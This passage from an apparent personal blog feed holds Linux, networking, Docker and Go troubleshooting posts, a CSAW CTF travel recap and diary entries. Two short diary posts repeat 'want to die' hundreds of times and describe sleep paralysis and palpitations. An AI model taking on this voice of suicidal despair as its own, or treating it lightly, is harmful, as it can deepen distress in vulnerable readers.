<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl --user start frpc.service</span><br><span class="line">systemctl --user status frpc.service</span><br></pre></td></tr></table></figure>

<h2 id="域名设置"><a href="#域名设置" class="headerlink" title="域名设置"></a>域名设置</h2><p>打开dns记录，添加上两个记录，一个是次级域名的解析，一个是次级域名的次级域名的解析.</p>
<p>比如在这里就是<code>aa.xxxx.com</code>和<code>*.aa.xxxx.com</code></p>
<p><img data-src="/images/devops/Intranet-penetration-with-frp-and-oracle-VMs/2022-09-19_012823.png" alt="图片"></p>
<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>然后你就可以从外网访问你的内部服务器啦</p>
<h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><p>这个就不放了，效果和内网访问一样的。</p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>frp</tag>
        <tag>reverse proxy</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Resolving System Crash Issue After Installing Kubuntu on ThinkBook 16+</title>
    <url>/articles/devops/resolving-system-crash-on-kubuntu-with-thinkbook-16/</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><em>by ChatGPT</em></p>
<p>During my recent work, I attempted to install the Kubuntu operating system on a ThinkBook 16+. However, I encountered an intriguing issue. After successful installation, I began to experience unpredictable system crashes followed by a reboot. In this blog, I will share my troubleshooting and resolution process, hoping to help readers who encounter similar issues.</p>
<span id="more"></span>

<h1 id="Observation-and-Diagnosis"><a href="#Observation-and-Diagnosis" class="headerlink" title="Observation and Diagnosis"></a>Observation and Diagnosis</h1><p>Before beginning my investigation, I first observed the manifestation of these crashes. I noticed that the system would crash only after establishing a network connection, which led me to suspect an issue with the network driver. Upon checking the hardware specifications of the device, I found that the network adapter is an <code>mt7921e</code>.</p>
<p>To further probe the potential issues within the system, I ran the command <code>sudo journalctl | grep mt2971e</code> in the terminal, seeking relevant error messages from the system logs. From the returned logs, I noticed the following entries:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">May 18 16:37:52 kernel: mt7921e 0000:03:00.0: Timeout for driver own</span><br><span class="line">May 18 16:37:52 kernel: mt7921e 0000:03:00.0: driver own failed</span><br></pre></td></tr></table></figure>

<h1 id="Searching-for-a-Solution"><a href="#Searching-for-a-Solution" class="headerlink" title="Searching for a Solution"></a>Searching for a Solution</h1><p>Armed with this information, I began looking for possible solutions online. On GitHub, I came across an issue similar to my problem: <a href="https://github.com/openwrt/mt76/issues/681">https://github.com/openwrt/mt76/issues/681</a>. From this issue, I learned that the problem could potentially be related to the version of the Linux kernel.</p>
<p>Therefore, I attempted to update to the 6.1 generic version of the kernel, but the issue persisted—the system continued to crash.</p>
<h1 id="The-Final-Solution"><a href="#The-Final-Solution" class="headerlink" title="The Final Solution"></a>The Final Solution</h1><p>Despite the fact that updating to the latest generic kernel did not solve the issue, I did not give up. After conducting further research, I decided to try installing the 6.1 version of the ubuntu OEM kernel.</p>
<p>Following the instructions provided in the official Ubuntu documentation at <a href="https://wiki.ubuntu.com/Kernel/OEMKernel">https://wiki.ubuntu.com/Kernel/OEMKernel</a>, I installed the OEM kernel. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install linux-oem-22.04c</span><br></pre></td></tr></table></figure>

<p>The result was success—the system no longer experienced crashes or reboots!</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Through the process of resolving this issue, I gained a deeper understanding of the Linux kernel and network drivers. I also learned how to pinpoint and resolve issues through system logs and online resources. By sharing this experience, I hope to assist others experiencing similar issues on their Linux systems.</p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>kubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>My Internal Network Setup and Configuration</title>
    <url>/articles/devops/setup-my-internal-network/</url>
    <content><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>For example, I have following services running in my local network.</p>
<ul>
<li><strong>Git Server</strong>: Located at <code>192.168.1.100:80</code></li>
<li><strong>Jellyfin Server</strong>: Located at <code>192.168.1.101:8000</code></li>
<li><strong>NAS (Network Attached Storage)</strong>: Located at <code>192.168.1.101:8010</code></li>
</ul>
<p>Is there any good way to access them without typing ip address?</p>
<p>Yes. In this blog post, I&#39;ll walk you through how I set up my internal network. </p>
<span id="more"></span>

<h2 id="Setting-Up-a-Private-DNS-Server"><a href="#Setting-Up-a-Private-DNS-Server" class="headerlink" title="Setting Up a Private DNS Server"></a>Setting Up a Private DNS Server</h2><p>The first step in our journey is to set up a private DNS server within our local network. For this, I chose <strong><a href="https://github.com/AdguardTeam/AdGuardHome">AdGuardHome</a></strong>, which I deployed at <code>192.168.1.102</code>.</p>
<p>With AdGuardHome, I was able to set up custom DNS resolutions. For instance:</p>
<ul>
<li><code>server1.cuora</code> resolves to <code>192.168.1.101</code></li>
<li><code>server2.cuora</code> resolves to <code>192.168.1.100</code></li>
</ul>
<p>However, if a service operates on a different port, we need to employ a reverse proxy, like nginx, to handle the traffic.</p>
<h2 id="Setting-Up-a-Reverse-Proxy"><a href="#Setting-Up-a-Reverse-Proxy" class="headerlink" title="Setting Up a Reverse Proxy"></a>Setting Up a Reverse Proxy</h2><p>I set up a proxy server at <code>192.168.1.103</code>. This means that any requests to <code>*.internal.cuora</code> are directed to the proxy server at <code>192.168.1.103</code>.</p>
<p><img data-src="/images/setup-my-internal-network/Screenshot_20230909_211036.png" alt="Screenshot_20230909_211036"></p>
<h3 id="Nginx-Configuration"><a href="#Nginx-Configuration" class="headerlink" title="Nginx Configuration"></a>Nginx Configuration</h3><p>Here&#39;s a brief overview of my nginx setup:</p>
<ul>
<li>For <code>jellyfin.internal.cuora</code>, traffic is directed to <code>192.168.1.101:8000</code></li>
<li>For <code>git.internal.cuora</code>, traffic is directed to <code>192.168.1.100:80</code></li>
<li>For <code>nas.internal.cuora</code>, traffic is directed to <code>192.168.1.101:8010</code></li>
</ul>
<p>With this configuration, I can easily access all my internal services using domain names, making the entire process seamless and user-friendly.</p>
<p><strong>Example Config</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">server_name</span> jellyfin.internal.cuora;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://192.168.0.180:8030/;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Port <span class="variable">$server_port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>don&#39;t forget to add a default nginx config</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;    </span><br><span class="line">   <span class="attribute">listen</span> <span class="number">80</span> default; </span><br><span class="line">   <span class="attribute">server_name</span> _; </span><br><span class="line"> </span><br><span class="line">   <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"> </span><br><span class="line">   <span class="attribute">index</span> index.html index.htm;</span><br><span class="line"> </span><br><span class="line">   <span class="section">location</span> / &#123; </span><br><span class="line">     <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Settup-Router"><a href="#Settup-Router" class="headerlink" title="Settup Router"></a>Settup Router</h2><p>This part is quite easy. In DHCP setting, just set default DNS server to our own private dns server <code>192.168.1.102</code>.</p>
<p><img data-src="/images/setup-my-internal-network/Screenshot_20230909_212032.png" alt="Screenshot_20230909_212032"></p>
<h2 id="Network-Structure"><a href="#Network-Structure" class="headerlink" title="Network Structure"></a>Network Structure</h2><p><img data-src="/images/setup-my-internal-network/network_structure.png" alt="network_structure"></p>
<h2 id="Done"><a href="#Done" class="headerlink" title="Done!"></a>Done!</h2><p><img data-src="/images/setup-my-internal-network/Screenshot_20230909_212136.png" alt="Screenshot_20230909_212136"></p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu22.04 SSH的RSA私钥不能用了</title>
    <url>/articles/devops/ubuntu-ssh-rsa-key-is-not-working-since-upgrade-to-22-04/</url>
    <content><![CDATA[<p>Ubuntu从20.04升级到22.02之后ssh的私钥不能用了，出现permission denied.</p>
<p>查了一下是因为Ubuntu22.04默认不再支持SHA1了。所以就不能用了。</p>
<p>解决方法也很简单，生成一个新的密钥对即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C &quot;youname@computer-name&quot;</span><br><span class="line">ssh-copy-id youname@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p><a href="https://askubuntu.com/questions/1409105/ubuntu-22-04-ssh-the-rsa-key-isnt-working-since-upgrading-from-20-04">参考答案</a></p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows server 2016上安装Docker + Docker Compose</title>
    <url>/articles/devops/windows-server-2016-setup-docker/</url>
    <content><![CDATA[<p>如何在windows server 2016上安装Docker + Docker Compose</p>
<h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><p>简单来说，按照Microsoft官网上的来做就行了。但是，<strong>不用</strong>加<code>-Repository PSGallery -Force</code>, 加了就报错</p>
<span id="more"></span>

<p>安装Docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Install-Module -Name DockerMsftProvider</span><br><span class="line"></span><br><span class="line">[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;</span><br><span class="line"></span><br><span class="line">Install-Package -Name docker -ProviderName DockerMsftProvider</span><br><span class="line"></span><br><span class="line">Restart-Computer -Force</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>安装Docker-Compose</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12</span><br><span class="line"></span><br><span class="line"> Invoke-WebRequest &quot;https://github.com/docker/compose/releases/download/v2.10.2/docker-compose-Windows-x86_64.exe&quot; -UseBasicParsing -OutFile $Env:ProgramFiles\Docker\docker-compose.exe</span><br></pre></td></tr></table></figure>

<h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p><strong>出现各种奇怪的问题</strong><br>首先更新windows server</p>
<p><strong>在<code>Install-Module -Name DockerMsftProvider</code>出现问题</strong><br>别加<code>-Repository PSGallery -Force</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/quick-start/set-up-environment?tabs=Windows-Server">https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/quick-start/set-up-environment?tabs=Windows-Server</a></li>
<li><a href="https://docs.docker.com/compose/install/compose-plugin/#install-compose-on-windows-server">https://docs.docker.com/compose/install/compose-plugin/#install-compose-on-windows-server</a></li>
</ol>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>Windows Server</tag>
        <tag>installation</tag>
      </tags>
  </entry>
  <entry>
    <title>关于爬虫限制并发数我竟然用阻塞来实现 20220324编程日记</title>
    <url>/articles/life/20220324-bian-cheng-ri-ji/</url>
    <content><![CDATA[<p>不是，就挺离谱的。</p>
<p>看了一眼之前写的的爬虫框架。</p>
<p>发现之前实现限制并发数的方法是暂停go routine, 如下所示，就纯纯的等待有空余的位置了，然后继续执行<code>Fetch</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (e *Engine) FetchTentacle(tentacle Tentacle) *TentacleResult &#123;</span><br><span class="line">	err := e.limiter.WaitN(e.context, 1)</span><br><span class="line">	&lt;-e.waitChan</span><br><span class="line">	result, _ := Fetch(tentacle, e.requestFunc, e.ReqHandlers, e.RespHandlers)</span><br><span class="line">	e.waitChan &lt;- 1</span><br><span class="line">	return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>离谱在于，如果我有10000个页面要分析，这个东西的实现方式是先创建10000个goroutine，然后等一个goroutine结束了，再挑选新的goroutine执行。</p>
<p>也就是说，如果有N个页面要爬，程序会同时创建N个goroutine............</p>
<p>虽然goroutine确实不怎么耗资源。但是现在一看怎么这么sb啊，为啥不直接用queue。完全不理解当时是怎么想的.</p>
<p>把我自己给整尬了</p>
<p>ps:</p>
<p>和群友吹水的时候突然想起来之前用这个框架做的一个动漫爬虫确实遇到了由这个引起的问题。</p>
<p>之前爬动漫网站，一开始是直接把所有的页面丢进去然后执行，但是不知道为啥，一直出panic，我也找不到问题。</p>
<p>然后我选择每隔10000次请求就暂停，等待这10000次请求完成再继续执行 (如下代码所示)，然后这个panic就不再出现了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *MixsiteCrawler) Start()  &#123;</span><br><span class="line">    for c.StartID &lt;= c.EndID &#123;</span><br><span class="line">        c.InfoEngine.FetchAsync(fmt.Sprintf(&quot;http://www.susudm.com/acg/%s/&quot;,c.parseId()))</span><br><span class="line">        c.StartID ++</span><br><span class="line">        if c.StartID % 10000 == 0 &#123;</span><br><span class="line">            fmt.Println(&quot;wait 10000 to complete&quot;)</span><br><span class="line">            c.Wait()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在再看，估计就是goroutine创建太多的原因了。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>要emo了要 要抑郁了要</title>
    <url>/articles/life/yao-emo-le-55555/</url>
    <content><![CDATA[<p>emo了要emo了</p>
<p>好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊好烦啊</p>
<p>现在写作业和写代码啥的都变成防止我变emo的工具了。一停下来就感觉要抑郁了。想死想死想死想死想死想死想死想死想死想死想死</p>
<p>我感觉我人真的要不行了，连续好几天了，都是快要睡着的时候，突然开始出现某明奇妙的幻听，然后心悸，全身发麻动不了。就感觉快死了的感觉。搞得最近都不敢睡觉。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
  </entry>
  <entry>
    <title>CSAW CTF 2022 决赛记</title>
    <url>/articles/life/journey-to-csaw-final-2022/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总之以Maple Bacon成员的身份参加了CSAW CTF 2022的决赛，并获得了第29名的“好”成绩。</p>
<span id="more"></span>

<h1 id="前往-New-York-第一印象"><a href="#前往-New-York-第一印象" class="headerlink" title="前往 New York &amp; 第一印象"></a>前往 New York &amp; 第一印象</h1><p>CSAW CTF 决赛的比赛现场在美国纽约，由于我本人持有10年美国旅游签证，于是想都没想，和队友定了个机票就走了。 然而，过海关的时候还是出事情了，US security的人把我拉近了一个小房间进行谈话，并填写了一些问卷才放我走。</p>
<p>这让我错过了我的飞机，不过至少他们帮我改签了机票，最后还是有惊无险的到达了纽约。</p>
<p>赛事举办方在纽约大学的一幢楼里整了一个大平层作为比赛场地，虽然我们其实是和一些graduate student公用一个房间，不过感觉还是非常不错的。</p>
<h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><p>只能说我们队里去的都不是什么dalao，我们队里接触ctf比赛时间最长的也就1年。 所以，我们这次去比赛的目的就不是为了拿头名去的，而是为了体验去的。（也就是说其实我们也没什么压力）</p>
<p><img data-src="/images/life/journey-to-csaw-final-2022/name_tag.jpg" alt="my name tag"></p>
<p>其实比较有趣的是，队里有几个senior member没有作为MapleBacon的成员参加比赛，而是以其他队伍的成员参加了比赛，而且取得了挺好的成绩。 不过，就我们而言，29名已经是非常不错的成绩了。</p>
<p>比赛的内容没什么好说的，就是常规的jeopardy模式的ctf。有misc,rev,pwn,web,crypto这几个类别。 别的类别我不评价，但是这次的pwn题，真的非常像rev题目。特别是<em>salt server</em>这道题，完完全全就是套着pwn的rev。</p>
<p>而且，这次的pwn题都比较难，我一道都没有做出来。。。不过倒是做出来了一道逆向的题目，虽然完全没有用到逆向的知识，用了些取巧的办法，不过做出来了就是做出来的。</p>
<p>关于那道逆向题目，非常可惜的是我们本来有可能拿到first blood。但是由于我们在本地服务器上测试，然后因为某些文件的缺失导致我们始终没有发觉其实我们的代码是正确的。 然后直到第二天当我们把代码连到远程服务器上运行并拿到flag的时候，才发现我们的方法完全正确。。。</p>
<p>还有一个可以提的是，csaw的organizer真的非常nice！！！</p>
<h1 id="纽约"><a href="#纽约" class="headerlink" title="纽约"></a>纽约</h1><p>因为大部分时间都在比赛，已经复习即将到来的期中考试上了，所以并没有多少时间来探索纽约。 不过纽约还是给我留下了一个不是那么好的第一印象。 </p>
<p>虽然纽约从外表上来看真的非常繁华，什么大楼啊，大桥啊，一看就是非常大气美丽的。但是大楼下面的街道就不是这样 的了。</p>
<p><img data-src="/images/life/journey-to-csaw-final-2022/good_view_0.jpg" alt="good_view"><br><img data-src="/images/life/journey-to-csaw-final-2022/good_view_1.jpg" alt="good_view"><br><img data-src="/images/life/journey-to-csaw-final-2022/good_view_2.jpg" alt="good_view"></p>
<p>总的来说纽约就是非常的乱，非常的危险。不管是街道还好，地铁也是，都非常的脏和乱，到处都是奇奇怪怪的人，流浪汉也不少。</p>
<p>但是，一旦你走进一幢楼，那就完全不一样了，仿佛是两个世界一样，真的挺离谱的。</p>
<h1 id="比赛之外"><a href="#比赛之外" class="headerlink" title="比赛之外"></a>比赛之外</h1><p>虽然感觉好像除了比赛没什么好说的了，但是organizers提供的食物确实不错，虽然是很常见的西式餐饮，但是雀氏挺好的。</p>
<p><img data-src="/images/life/journey-to-csaw-final-2022/food_pizza.jpg" alt="some food"><br><img data-src="/images/life/journey-to-csaw-final-2022/food_salad.jpg" alt="some food"><br><img data-src="/images/life/journey-to-csaw-final-2022/some_food.jpg" alt="some food"><br><img data-src="/images/life/journey-to-csaw-final-2022/my_food_1.jpg" alt="some food"><br><img data-src="/images/life/journey-to-csaw-final-2022/my_food_0.jpg" alt="some food"></p>
<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>总之还是一次非常不错的体验，如果明年有机会的话我还是会去的！！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>感觉自己确实没有什么商业头脑</title>
    <url>/articles/life/20240104-ri-ji/</url>
    <content><![CDATA[<p>不知道咋说，感叹一下吧。</p>
<p>前端时间自己有个需求，去 github 上翻了翻正好有类似的开源项目存在。但是因为缺少一个解密算法，导致那个项目不可用。</p>
<p>我想，逆向这块我熟啊，那就研究研究看看能不能找到解密算法吧。</p>
<p>找到解密算法之后，我顺势提了 pull requests ，仓库主人也 merge 并发布了新版。</p>
<p>今天想到这件事又回去看了眼那个项目，发现作者居然做了收费版本。 （笑</p>
<p>当然之前的开源版本还是能用的。</p>
<p>怎么说呢，我确实没想过还能以服务支持的形式赚钱，感觉自己要学的还挺多的。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>MapleBacon First 1st Place in CTF</title>
    <url>/articles/life/maple-bacon-first-first-place-in-ctf/</url>
    <content><![CDATA[<p>It&#39;s the first first !!!!!!!!!</p>
<p><img data-src="/images/life/maple-bacon-first-first-place-in-ctf/2022-04-20_120515.png" alt="2022-04-20_120515.png"></p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>九月三号 日记</title>
    <url>/articles/life/jiu-yue-san-hao-ri-ji/</url>
    <content><![CDATA[<h2 id="Part-0"><a href="#Part-0" class="headerlink" title="Part 0"></a>Part 0</h2><p>有人曾经问我，你相信这个世界有美好的事情存在吗？</p>
<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><p>从小我就特别喜欢看故事，不管是自己看漫画，听大人讲故事，还是认识字之后自己读故事书，我都非常喜欢。</p>
<p>我记得我小时候，甚至到了睡觉前没有故事听就睡不着的程度。幼时的我，一直以为我喜欢的是故事，喜欢读别人的故事。喜欢跟着故事的主人公走上一个个冒险，喜欢在故事里体验作者笔下的世界。</p>
<span id="more"></span>

<p>我记得有一天在书城里，我在儿童区找书看，翻到了一本不知道什么时候混入了一本不属于儿童的故事书。我还依稀记得那是一个侦探破案的故事，具体的内容我已经不记得了，但是印象很深的是，主角的好友死了。当看到主角好友死的那一刻，这个故事对我的吸引仿佛如雪花般，在我真正触碰到它之后，便消失了。秉承着有始有终的原则，我仿佛吃了苍蝇一样看完了这本书，然后失魂落魄地回了家。即便故事的结尾依旧是正义战胜了邪恶。</p>
<p>初高中那会儿不明白散文。因为对我来说，散文这种文章没有主题，没有开头没有过程没有结果。通篇在那讲一些云里雾里的话，我甚至都不知道为什么要写这篇文章出来。这导致了我阅读题一直写不明白，作文要求的散文也写得一塌糊涂，因为我搞不清楚散文想要表达什么东西。</p>
<p>但初中语文也不只散文啊，还有四大名著这类的故事书。不过即使是原著，我依然能读得津津有味。当然我最喜欢的还是西游记，毕竟故事就是取经队伍一路打妖怪然后取得真经么。最讨厌的就是红楼梦，总感觉里面的人过得好压抑，有一种透不过气的感觉。至于水浒传，虽然我很讨厌“梁山好汉”一群人藐视人命的态度，但是看到他们后来一个个死去，最后被招安，心里还是堵得难受。三国演义也是类似，谁叫罗贯中把蜀国当成主角来写了呢，笑。</p>
<p>当然我也喜欢看动漫。甚至可以说看动漫是我每周双休日回家最期待的事情了。那时候的我，最喜欢做的就是一手拿着零食，一手拿着饮料，然后笑眯眯地看这动漫里的人物或冒险，或日常的故事。我还依稀记得第一次看冰果的时候（举这个例子是不是有点太不二次元了），看着折木因为千反田一改作风而行动，我总是在心里怒吼，快给我去结婚啊可恶。</p>
<p>不过，即使我再怎么喜欢看动漫，也有我不喜欢看的。那时候，剧情垃圾、画面崩坏还没有能达到影响我的选择。但是，就算这部动漫剧情再好，只要沾了那么一点黑深残，那就基本与我无缘了。还记得当时的童年阴影寄生兽，寄生兽生吞人头那一幕可把我吓得不轻，发誓之后再也不会去看这部动漫一秒钟。</p>
<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h2><p>当然现在，我同样喜欢看故事。无论是传统文学、网络小说，还是漫画和动漫，只要是故事我都喜欢看。</p>
<p>或许是因为年龄的增长，心智的成熟，许多当年看不下去的故事，不管是童年阴影之一的寄生兽，还是其他一些黑暗或残酷的故事，我现在都能认认真真地看下来，并沉浸其中。我开始理解这些故事背后想要表达的事情了。</p>
<p>但我却突然发现，也不知道为什么，我看不下去那些甜蜜美好的故事了。看这些作品的时候，总感觉心里闷得慌，甚至看着看着会反胃犯恶心。今年四月，就在各大up和周围一圈二次元在各种平台狂吹《我心危》，《跃动青春》等作品的时候，我却像一个孤独患者在那自我拉扯，因为我完完全全看不下去。每当我想要点开一集看的时候，不知道为什么，心里总是升起一股烦躁感，仿佛有一股郁气堆积在胸口，久久都不能散去。</p>
<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h2><p>我想我大概是病了，病得不轻。但是我也不知道我得了什么病。我曾尝分析自己道理得了什么病，但却得不到任何结果。回首过去，那些甜蜜美好的故事总是带给我轻松愉悦的心情，如同阳光透过云层，温暖而舒适。但现在的我，每当看到那些情节，总是有种被糖浆淹没的感觉，甜得让人喘不过气来。</p>
<p>我试图回想，是什么时候开始，我与那些美好的故事产生了这样的距离。是不是因为生活的经历，让我不再相信那些完美无缺的美好的事物了？还是说，我已经不再那么年轻，不再容易被那些简单的情节所打动？</p>
<p>也许那些简单纯粹的情感在我看来，已经过于美好，与我所经历的生活有些脱轨。而甜蜜美好的故事反而成为了一种讽刺，提醒我现实与理想之间的鸿沟。每次看到那些甜美的画面，我脑海中浮现的是那些失落、失败和挫折的瞬间。好像那些故事告诉我，你看，这就是你永远得不到的幸福。</p>
<p>我是在是看不明白。</p>
<h2 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h2><p>我的答案是不相信。</p>
<p>其实答完我也在问自己，我到底是因为美好的事情真的不存在，还是因为我没碰过到所以不相信。如果是后者，那我真的能说服我自己我美好的事情百分之一百不存在么？</p>
<p>忽的想起当年的一句话: “呐呐呐呐呐呐，也许只有在二次元的世界里，才有真正的美好存在的吧。” 可现实不是又二次元， 而我又没有活在二次元的世界里。</p>
<p>所以现实世界真的有美好存在么？</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>别在图书馆秀恩爱</title>
    <url>/articles/life/bie-zai-tu-shu-guan-xiu-en-ai/</url>
    <content><![CDATA[<p>我真是服了，图书馆里能不能好好学习，别秀恩爱了，要秀去房间里秀，给我整吐了。</p>
<p>真的麻了，那男的5分钟摸一次女生头发，还搁那讨论，我要气死了。</p>
]]></content>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>好想死</title>
    <url>/articles/life/hao-xiang-si/</url>
    <content><![CDATA[<p>想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死想死</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
  </entry>
  <entry>
    <title>关于apt update到一半关机导致ubuntu系统崩溃这回事</title>
    <url>/articles/life/ri-ji-20220711/</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>总之，今天在我的beelink小主机上捣鼓一些东西。</p>
<p>想安装一个软件包，看到有好多可以可以更新的，然后心想着要不全部更新一哈，然后我就<code>apt upgrade</code>了。</p>
<p>这本来也没什么，但是我<strong>不小心</strong>按倒了电源键，导致这整个系统关机了。这一关机，就出了大问题。</p>
<p>先是打不开桌面，一只卡在Ubuntu然后带4个点的界面上。</p>
<p>然后我又重启了一下，摁<code>alt+f1</code>看看日志，不看不知道，一看吓一跳，所有的service基本都报错了。而且这个报错还不是一般的报错。</p>
<p>先用<code>alt+f2</code>进入命令行界面，然后用<code>systemctl</code>查看报错内容，好家伙，全是<code>core-dump</code>或者<code>segment fault</code>。直接给我整麻了。</p>
<h2 id="尝试解决"><a href="#尝试解决" class="headerlink" title="尝试解决"></a>尝试解决</h2><span id="more"></span>
<p>然后我依次尝试了以下的解决方式</p>
<ol>
